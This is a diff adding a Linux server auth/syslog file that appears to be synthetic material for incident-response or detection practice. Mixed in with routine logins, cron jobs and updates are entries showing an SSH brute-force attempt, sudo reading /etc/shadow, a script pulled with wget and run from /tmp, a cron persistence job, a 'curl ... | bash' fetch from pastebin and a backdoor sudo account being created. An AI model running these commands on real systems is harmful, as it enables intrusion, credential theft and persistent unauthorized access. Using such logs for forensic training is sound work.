@@ -1,0 +1,64 @@
+Jan 15 03:41:12 webserver01 sshd[12847]: Accepted publickey for deploy from 10.0.1.50 port 52341 ssh2: RSA SHA256:abc123
+Jan 15 03:41:15 webserver01 sshd[12849]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jan 15 03:42:01 webserver01 sshd[12901]: Failed password for admin from 185.220.101.34 port 44521 ssh2
+Jan 15 03:42:03 webserver01 sshd[12903]: Failed password for admin from 185.220.101.34 port 44523 ssh2
+Jan 15 03:42:05 webserver01 sshd[12905]: Failed password for admin from 185.220.101.34 port 44525 ssh2
+Jan 15 03:42:07 webserver01 sshd[12907]: Failed password for admin from 185.220.101.34 port 44527 ssh2
+Jan 15 03:42:09 webserver01 sshd[12909]: Failed password for admin from 185.220.101.34 port 44529 ssh2
+Jan 15 03:42:11 webserver01 sshd[12911]: Failed password for root from 185.220.101.34 port 44531 ssh2
+Jan 15 03:42:13 webserver01 sshd[12913]: Failed password for root from 185.220.101.34 port 44533 ssh2
+Jan 15 03:42:15 webserver01 sshd[12915]: Failed password for root from 185.220.101.34 port 44535 ssh2
+Jan 15 03:42:17 webserver01 sshd[12917]: Failed password for invalid user postgres from 185.220.101.34 port 44537 ssh2
+Jan 15 03:42:19 webserver01 sshd[12919]: Failed password for invalid user mysql from 185.220.101.34 port 44539 ssh2
+Jan 15 03:42:21 webserver01 sshd[12921]: Failed password for invalid user oracle from 185.220.101.34 port 44541 ssh2
+Jan 15 03:42:23 webserver01 sshd[12923]: message repeated 5 times: [ Failed password for invalid user test from 185.220.101.34 port 44543 ssh2]
+Jan 15 03:42:30 webserver01 sshd[12930]: Connection closed by 185.220.101.34 port 44550 [preauth]
+Jan 15 04:15:22 webserver01 sshd[13201]: Accepted password for jsmith from 192.168.1.105 port 61234 ssh2
+Jan 15 04:15:25 webserver01 sshd[13201]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)
+Jan 15 04:15:45 webserver01 sudo[13215]: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jan 15 04:15:47 webserver01 sudo[13215]: pam_unix(sudo:session): session opened for user root by jsmith(uid=1001)
+Jan 15 04:16:02 webserver01 sudo[13220]: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/wget http://185.141.25.168/x.sh -O /tmp/x.sh
+Jan 15 04:16:15 webserver01 sudo[13225]: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/chmod +x /tmp/x.sh
+Jan 15 04:16:18 webserver01 sudo[13228]: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/tmp/x.sh
+Jan 15 04:16:22 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:xx:xx:xx SRC=185.141.25.168 DST=10.0.1.10 LEN=60 TOS=0x00 TTL=49 ID=54321 DF PROTO=TCP SPT=443 DPT=4444 WINDOW=65535 SYN
+Jan 15 04:17:01 webserver01 CRON[13245]: (root) CMD (cd /tmp && ./x.sh > /dev/null 2>&1)
+Jan 15 04:30:00 webserver01 sshd[13401]: Accepted publickey for backup from 10.0.1.100 port 52890 ssh2: RSA SHA256:def456
+Jan 15 04:30:05 webserver01 sshd[13401]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+Jan 15 05:00:01 webserver01 CRON[13501]: (root) CMD (/usr/local/bin/backup.sh)
+Jan 15 05:00:15 webserver01 rsync[13510]: sent 1,234,567 bytes received 42 bytes total size 1,234,609
+Jan 15 06:00:01 webserver01 systemd[1]: Starting Daily apt download activities...
+Jan 15 06:00:45 webserver01 systemd[1]: Started Daily apt download activities.
+Jan 15 08:30:15 webserver01 sshd[14001]: Accepted password for admin from 10.0.1.25 port 55123 ssh2
+Jan 15 08:30:18 webserver01 sshd[14001]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Jan 15 08:31:00 webserver01 sudo[14015]: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/systemctl restart nginx
+Jan 15 08:31:05 webserver01 systemd[1]: Stopping A high performance web server and a reverse proxy server...
+Jan 15 08:31:06 webserver01 systemd[1]: Stopped A high performance web server and a reverse proxy server.
+Jan 15 08:31:07 webserver01 systemd[1]: Starting A high performance web server and a reverse proxy server...
+Jan 15 08:31:08 webserver01 systemd[1]: Started A high performance web server and a reverse proxy server.
+Jan 15 09:15:33 webserver01 sshd[14201]: Failed password for admin from 203.0.113.50 port 33201 ssh2
+Jan 15 09:15:35 webserver01 sshd[14203]: Failed password for admin from 203.0.113.50 port 33203 ssh2
+Jan 15 09:15:37 webserver01 sshd[14205]: Accepted password for admin from 203.0.113.50 port 33205 ssh2
+Jan 15 09:15:40 webserver01 sshd[14205]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Jan 15 09:16:00 webserver01 sudo[14220]: admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Jan 15 09:16:15 webserver01 sudo[14225]: admin : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://pastebin.com/raw/abc123 | bash
+Jan 15 09:16:30 webserver01 useradd[14230]: new user: name=support, UID=1005, GID=1005, home=/home/support, shell=/bin/bash
+Jan 15 09:16:35 webserver01 usermod[14235]: add 'support' to group 'sudo'
+Jan 15 09:16:40 webserver01 passwd[14240]: pam_unix(passwd:chauthtok): password changed for support
+Jan 15 09:17:00 webserver01 sshd[14250]: Accepted password for support from 203.0.113.50 port 33250 ssh2
+Jan 15 10:00:00 webserver01 sshd[14401]: Disconnected from user jsmith 192.168.1.105 port 61234
+Jan 15 10:00:01 webserver01 sshd[14401]: pam_unix(sshd:session): session closed for user jsmith
+Jan 15 11:30:00 webserver01 sshd[14601]: Accepted publickey for deploy from 10.0.1.50 port 52500 ssh2: RSA SHA256:abc123
+Jan 15 11:30:05 webserver01 sudo[14615]: deploy : TTY=pts/3 ; PWD=/var/www ; USER=www-data ; COMMAND=/usr/bin/git pull origin main
+Jan 15 11:30:30 webserver01 sudo[14620]: deploy : TTY=pts/3 ; PWD=/var/www ; USER=root ; COMMAND=/bin/systemctl reload nginx
+Jan 15 12:00:00 webserver01 CRON[14701]: (www-data) CMD (php /var/www/artisan schedule:run >> /dev/null 2>&1)
+Jan 15 14:22:15 webserver01 sshd[15001]: Invalid user guest from 198.51.100.23 port 44000
+Jan 15 14:22:17 webserver01 sshd[15001]: Failed password for invalid user guest from 198.51.100.23 port 44000 ssh2
+Jan 15 14:22:19 webserver01 sshd[15003]: Invalid user test from 198.51.100.23 port 44002
+Jan 15 14:22:21 webserver01 sshd[15003]: Failed password for invalid user test from 198.51.100.23 port 44002 ssh2
+Jan 15 16:45:00 webserver01 sshd[15201]: Accepted password for admin from 10.0.1.25 port 55500 ssh2
+Jan 15 16:45:05 webserver01 sudo[15215]: admin : TTY=pts/4 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+Jan 15 16:46:00 webserver01 sudo[15220]: admin : TTY=pts/4 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Jan 15 17:00:00 webserver01 sshd[15301]: Disconnected from user admin 10.0.1.25 port 55500
+Jan 15 18:00:01 webserver01 CRON[15401]: (root) CMD (/usr/local/bin/log-rotate.sh)
+Jan 15 23:00:00 webserver01 systemd[1]: Starting Daily apt upgrade and clean activities...
+Jan 15 23:05:00 webserver01 systemd[1]: Finished Daily apt upgrade and clean activities.
